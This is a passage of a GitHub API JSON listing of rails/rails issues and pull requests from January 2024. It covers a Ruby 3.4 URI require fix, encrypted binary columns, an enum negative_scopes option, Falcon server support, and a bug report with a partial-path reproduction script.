            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-30T11:49:46Z",
        "updated_at": "2024-01-31T09:08:27Z",
        "closed_at": "2024-01-31T00:19:55Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50922",
            "html_url": "https://github.com/rails/rails/pull/50922",
            "diff_url": "https://github.com/rails/rails/pull/50922.diff",
            "patch_url": "https://github.com/rails/rails/pull/50922.patch",
            "merged_at": "2024-01-31T00:19:55Z"
        },
        "body": "Fixes #50910.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50922/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50922/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50921",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50921/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50921/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50921/events",
        "html_url": "https://github.com/rails/rails/pull/50921",
        "id": 2107609326,
        "node_id": "PR_kwDNIULOZXA7yA",
        "number": 50921,
        "title": "Require 'uri' explicitly to address `NameError: uninitialized constant ToQueryTest::URI`",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-30T11:33:51Z",
        "updated_at": "2024-02-13T22:54:00Z",
        "closed_at": "2024-01-30T18:48:59Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50921",
            "html_url": "https://github.com/rails/rails/pull/50921",
            "diff_url": "https://github.com/rails/rails/pull/50921.diff",
            "patch_url": "https://github.com/rails/rails/pull/50921.patch",
            "merged_at": "2024-01-30T18:48:59Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis commit addresses CI failure at https://buildkite.com/rails/rails-nightly/builds/108#018d57ac-4f2a-45f1-86b9-9015a7b0a463/1165-2002\r\n\r\n\r\n### Detail\r\n\r\nThis commit addresses the following `NameError: uninitialized constant ToQueryTest::URI`.\r\n\r\n```ruby\r\n$ ruby -v\r\nruby 3.4.0dev (2024-01-30T10:19:23Z master 86547fd69d) [x86_64-linux]\r\n$ rm Gemfile.lock\r\n$ bundle install\r\n$ cd activesupport\r\n$ bin/test test/core_ext/object/to_query_test.rb -n test_hash_not_sorted_lexicographically_for_nested_structure\r\n... snip ...\r\n\r\nE\r\n\r\nError:\r\nToQueryTest#test_hash_not_sorted_lexicographically_for_nested_structure:\r\nNameError: uninitialized constant ToQueryTest::URI\r\n    test/core_ext/object/to_query_test.rb:90:in `test_hash_not_sorted_lexicographically_for_nested_structure'\r\n\r\nbin/test test/core_ext/object/to_query_test.rb:79\r\n\r\nFinished in 0.000385s, 2597.3082 runs/s, 0.0000 assertions/s.\r\n1 runs, 0 assertions, 0 failures, 1 errors, 0 skips\r\n$\r\n```\r\n\r\n### Additional information\r\n\r\nThis behavior has been introduced since Ruby 3.4.0dev vendors URI from top level to `Gem::URI` via https://github.com/ruby/ruby/commit/d64d0b54231208c7bec899a7fe8c3b98ec2e9a1b . Here is the original one that explains some reason why https://github.com/rubygems/rubygems/pull/7386\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50921/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50921/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50920",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50920/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50920/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50920/events",
        "html_url": "https://github.com/rails/rails/pull/50920",
        "id": 2107533190,
        "node_id": "PR_kwDNIULOZW8w1g",
        "number": 50920,
        "title": "Support encrypting binary columns",
        "user": {
            "login": "djmb",
            "id": 1734607,
            "node_id": "MDQ6VXNlcjE3MzQ2MDc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1734607?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/djmb",
            "html_url": "https://github.com/djmb",
            "followers_url": "https://api.github.com/users/djmb/followers",
            "following_url": "https://api.github.com/users/djmb/following{/other_user}",
            "gists_url": "https://api.github.com/users/djmb/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/djmb/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/djmb/subscriptions",
            "organizations_url": "https://api.github.com/users/djmb/orgs",
            "repos_url": "https://api.github.com/users/djmb/repos",
            "events_url": "https://api.github.com/users/djmb/events{/privacy}",
            "received_events_url": "https://api.github.com/users/djmb/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/83",
            "html_url": "https://github.com/rails/rails/milestone/83",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/83/labels",
            "id": 9964242,
            "node_id": "MI_kwDNIULOAJgK0g",
            "number": 83,
            "title": "7.2.0",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 7,
            "closed_issues": 11,
            "state": "open",
            "created_at": "2023-09-25T20:29:14Z",
            "updated_at": "2024-02-20T23:25:19Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 1,
        "created_at": "2024-01-30T10:53:34Z",
        "updated_at": "2024-02-15T16:46:43Z",
        "closed_at": "2024-02-15T16:45:56Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50920",
            "html_url": "https://github.com/rails/rails/pull/50920",
            "diff_url": "https://github.com/rails/rails/pull/50920.diff",
            "patch_url": "https://github.com/rails/rails/pull/50920.patch",
            "merged_at": "2024-02-15T16:45:56Z"
        },
        "body": "\r\n### Motivation / Background\r\n\r\nActiveRecord Encryption doesn't prevent you from encrypting binary columns but it doesn't have proper support for it either.\r\n\r\nWhen the data is fed through encrypt/decrypt it is converted to a String. This means that the the encryption layer is not transparent to binary data - which should be passed as Type::Binary::Data.\r\n\r\nAs a result the data is not properly escaped in the SQL queries or deserialized correctly after decryption.\r\n\r\nHowever it just happens to work fine for MySQL and SQLite because the MessageSerializer doesn't use any characters that need to be encoded. However if you try to use a custom serializer that does then it breaks.\r\n\r\nPostgreSQL on the other hand does not work - because the Bytea type is passed a String rather than a Type::Binary::Data to deserialize, it attempts to unescape the data and either mangles it or raises an error if it contains null bytes.\r\n\r\n### Detail\r\n\r\nThe commit fixes the issue, by reserializing the data after encryption and decryption. For text data that's a no-op, but for binary data we'll convert it back to a Type::Binary::Data.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50920/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50920/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50919",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50919/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50919/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50919/events",
        "html_url": "https://github.com/rails/rails/pull/50919",
        "id": 2107305664,
        "node_id": "PR_kwDNIULOZWwUOw",
        "number": 50919,
        "title": "Add negative_scopes option to ActiveRecord's enum method",
        "user": {
            "login": "Jay0921",
            "id": 12777550,
            "node_id": "MDQ6VXNlcjEyNzc3NTUw",
            "avatar_url": "https://avatars.githubusercontent.com/u/12777550?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Jay0921",
            "html_url": "https://github.com/Jay0921",
            "followers_url": "https://api.github.com/users/Jay0921/followers",
            "following_url": "https://api.github.com/users/Jay0921/following{/other_user}",
            "gists_url": "https://api.github.com/users/Jay0921/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Jay0921/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Jay0921/subscriptions",
            "organizations_url": "https://api.github.com/users/Jay0921/orgs",
            "repos_url": "https://api.github.com/users/Jay0921/repos",
            "events_url": "https://api.github.com/users/Jay0921/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Jay0921/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-30T09:11:41Z",
        "updated_at": "2024-01-30T09:40:23Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50919",
            "html_url": "https://github.com/rails/rails/pull/50919",
            "diff_url": "https://github.com/rails/rails/pull/50919.diff",
            "patch_url": "https://github.com/rails/rails/pull/50919.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nIn certain situation, we might need to store and query `negative` values. Having the option to bypass the auto-generated negative scopes can avoid the conflicts.\r\n\r\n### Detail\r\n\r\nAdd `negative_scopes` option to `ActiveRecord::Enum#enum`, this offers the flexibility to optionally skip the creation of negative scopes.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50919/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50919/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50918",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50918/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50918/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50918/events",
        "html_url": "https://github.com/rails/rails/pull/50918",
        "id": 2107146058,
        "node_id": "PR_kwDNIULOZWntbg",
        "number": 50918,
        "title": "More efficiently reset inspect implementation",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-30T07:36:13Z",
        "updated_at": "2024-01-30T12:21:56Z",
        "closed_at": "2024-01-30T12:21:56Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50918",
            "html_url": "https://github.com/rails/rails/pull/50918",
            "diff_url": "https://github.com/rails/rails/pull/50918.diff",
            "patch_url": "https://github.com/rails/rails/pull/50918.patch",
            "merged_at": "2024-01-30T12:21:56Z"
        },
        "body": "Not that `inspect` is anywhere close to be a hostspot, but just to not allow a less defficient pattern.\r\n\r\nInstead of allocating an UnboundMethod and bind_call it, we can directly replace the method.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50918/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50918/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50917",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50917/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50917/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50917/events",
        "html_url": "https://github.com/rails/rails/pull/50917",
        "id": 2106941444,
        "node_id": "PR_kwDNIULOZWcvvg",
        "number": 50917,
        "title": "Add support for `rails new --server falcon ...`.",
        "user": {
            "login": "ioquatix",
            "id": 30030,
            "node_id": "MDQ6VXNlcjMwMDMw",
            "avatar_url": "https://avatars.githubusercontent.com/u/30030?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ioquatix",
            "html_url": "https://github.com/ioquatix",
            "followers_url": "https://api.github.com/users/ioquatix/followers",
            "following_url": "https://api.github.com/users/ioquatix/following{/other_user}",
            "gists_url": "https://api.github.com/users/ioquatix/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ioquatix/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ioquatix/subscriptions",
            "organizations_url": "https://api.github.com/users/ioquatix/orgs",
            "repos_url": "https://api.github.com/users/ioquatix/repos",
            "events_url": "https://api.github.com/users/ioquatix/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ioquatix/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-01-30T04:42:44Z",
        "updated_at": "2024-01-30T23:43:17Z",
        "closed_at": "2024-01-30T19:02:32Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50917",
            "html_url": "https://github.com/rails/rails/pull/50917",
            "diff_url": "https://github.com/rails/rails/pull/50917.diff",
            "patch_url": "https://github.com/rails/rails/pull/50917.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because using `falcon` (or indeed, any other server, e.g. `pitchfork`) should be easy.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes `rails new` and adds support for `--server puma` or `--server falcon`.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50917/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 1,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50917/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50916",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50916/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50916/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50916/events",
        "html_url": "https://github.com/rails/rails/issues/50916",
        "id": 2106914874,
        "node_id": "I_kwDNIULOfZT4Og",
        "number": 50916,
        "title": "Unexpected controller prefix path de-duplication in view partial lookup paths",
        "user": {
            "login": "sfnelson",
            "id": 325974,
            "node_id": "MDQ6VXNlcjMyNTk3NA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/325974?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sfnelson",
            "html_url": "https://github.com/sfnelson",
            "followers_url": "https://api.github.com/users/sfnelson/followers",
            "following_url": "https://api.github.com/users/sfnelson/following{/other_user}",
            "gists_url": "https://api.github.com/users/sfnelson/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sfnelson/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sfnelson/subscriptions",
            "organizations_url": "https://api.github.com/users/sfnelson/orgs",
            "repos_url": "https://api.github.com/users/sfnelson/repos",
            "events_url": "https://api.github.com/users/sfnelson/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sfnelson/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-30T04:10:56Z",
        "updated_at": "2024-01-30T04:22:29Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\nCreate nested controller and nested object views where there is overlap between the controller and object namespaces. For example:\r\n\r\n- `Courses::Quiz::Question` and `Courses::Quiz::QuestionsController`\r\n- `Courses::Quiz::Question` and `Learning::Quiz::Extra::QuestionsController`\r\n- `Courses::Quiz::Question` and `Learning::Courses::Quiz::QuestionsController`\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  gem \"rails\"\r\nend\r\n\r\nrequire \"action_controller/railtie\"\r\nrequire \"active_model/railtie\"\r\n\r\nclass TestApp < Rails::Application\r\n  config.root = __dir__\r\n  config.hosts << \"example.org\"\r\n  config.secret_key_base = \"secret_key_base\"\r\n\r\n  config.logger = Logger.new($stdout)\r\n  Rails.logger  = config.logger\r\n\r\n  routes.draw do\r\n    get \"/unrelated\" => \"learning/questions#new\"\r\n    get \"/duplication\" => \"courses/quiz/questions#new\"\r\n    get \"/collision\" => \"learning/quiz/extra/questions#new\"\r\n    get \"/repetition\" => \"learning/courses/quiz/questions#new\"\r\n  end\r\nend\r\n\r\nmodule Courses\r\n  module Quiz\r\n    class Question\r\n      include ActiveModel::Model\r\n\r\n      attr_accessor :name\r\n    end\r\n\r\n    class QuestionsController < ActionController::Base\r\n      def new\r\n        render partial: ::Courses::Quiz::Question.new(name: \"partial\")\r\n      end\r\n    end\r\n  end\r\nend\r\n\r\nmodule Learning\r\n  class QuestionsController < ActionController::Base\r\n    def new\r\n      render partial: ::Courses::Quiz::Question.new(name: \"partial\")\r\n    end\r\n  end\r\n\r\n  module Quiz\r\n    module Extra\r\n      class QuestionsController < ActionController::Base\r\n        def new\r\n          render partial: ::Courses::Quiz::Question.new(name: \"partial\")\r\n        end\r\n      end\r\n    end\r\n  end\r\n\r\n  module Courses\r\n    module Quiz\r\n      class QuestionsController < ActionController::Base\r\n        def new\r\n          render partial: ::Courses::Quiz::Question.new(name: \"partial\")\r\n        end\r\n      end\r\n    end\r\n  end\r\nend\r\n\r\nrequire \"minitest/autorun\"\r\nrequire \"rack/test\"\r\n\r\nclass BugTest < Minitest::Test\r\n  include Rack::Test::Methods\r\n\r\n  def setup\r\n    super\r\n    @views = Dir.mktmpdir\r\n    ActionController::Base.prepend_view_path @views\r\n  end\r\n\r\n  #  PASSES\r\n  def test_unrelated_partial\r\n    view_file \"learning/courses/quiz/questions/_question.html.erb\", \"Nested <%= question.name %>\"\r\n\r\n    get \"/unrelated\"\r\n    assert_equal \"Nested partial\", last_response.body\r\n  end\r\n\r\n  #  PASSES\r\n  def test_duplication\r\n    view_file \"courses/quiz/questions/_question.html.erb\", \"De-duplicated <%= question.name %>\"\r\n\r\n    get \"/duplication\"\r\n    assert_equal \"De-duplicated partial\", last_response.body\r\n  end\r\n\r\n  #  FAILS\r\n  # AbstractRenderer#merge_prefix_into_object_path breaks after the first match, skips 'extra'\r\n  def test_collision\r\n    view_file \"learning/courses/quiz/questions/_question.html.erb\", \"Harmful de-duplication <%= question.name %>\"\r\n    view_file \"learning/courses/extra/courses/quiz/questions/_question.html.erb\", \"Nested <%= question.name %>\"\r\n\r\n    get \"/collision\"\r\n    assert_equal \"Collision partial\", last_response.body\r\n  end\r\n\r\n  #  FAILS\r\n  # AbstractRenderer#merge_prefix_into_object_path fails to find overlap because offsets do not align\r\n  def test_repetition\r\n    view_file \"learning/courses/quiz/questions/_question.html.erb\", \"De-duplicated <%= question.name %>\"\r\n    view_file \"learning/courses/quiz/courses/quiz/questions/_question.html.erb\", \"Nested <%= question.name %>\"\r\n\r\n    get \"/repetition\"\r\n    assert_equal \"De-duplicated partial\", last_response.body\r\n  end\r\n\r\n  private\r\n\r\n  def app\r\n    Rails.application\r\n  end\r\n\r\n  def view_file(name, content)\r\n    path = Pathname.new(@views).join(name)\r\n    path.dirname.tap(&:mkpath)\r\n    path.write(content)\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n\r\n- Courses::Quiz::Question and Courses::Quiz::QuestionsController\r\n   module duplication is detected and removed\r\n- Courses::Quiz::Question and Learning::Quiz::Extra::QuestionsController\r\n   `quiz/extra` suffix on the controller does not match the `quiz` prefix on the model so no de-duplication is performed. Partial should be `learning/courses/extra/courses/quiz/questions/_question.html.erb`\r\n- Courses::Quiz::Question and Learning::Courses::Quiz::QuestionsController\r\n   `courses/quiz` suffix on controller matches `courses/quiz` prefix on model so repetition is removed. Partial should be `learning/courses/quiz/questions/_question.html.erb`\r\n\r\n### Actual behavior\r\n\r\n-  Courses::Quiz::Question and Courses::Quiz::QuestionsController\r\n   module duplication is detected and removed\r\n-  Courses::Quiz::Question and Learning::Quiz::Extra::QuestionsController\r\n   `Quiz` is detected as overlap and `Extra` is dropped from the partial path, this is confusing and inconsistent\r\n-  Courses::Quiz::Question and Learning::Courses::Quiz::QuestionsController\r\n   no module duplication is detected, so full module path to controller is prefixed on the object path  deep repetition\r\n\r\n### System configuration\r\n**Rails version**: 7.1.0\r\n\r\n**Ruby version**: 3.2.3\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50916/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50916/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50915",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50915/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50915/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50915/events",
        "html_url": "https://github.com/rails/rails/pull/50915",
        "id": 2106908831,
        "node_id": "PR_kwDNIULOZWbDEw",
        "number": 50915,
        "title": "Fix teardown callbacks",
        "user": {
            "login": "ttstarck",
            "id": 16530564,
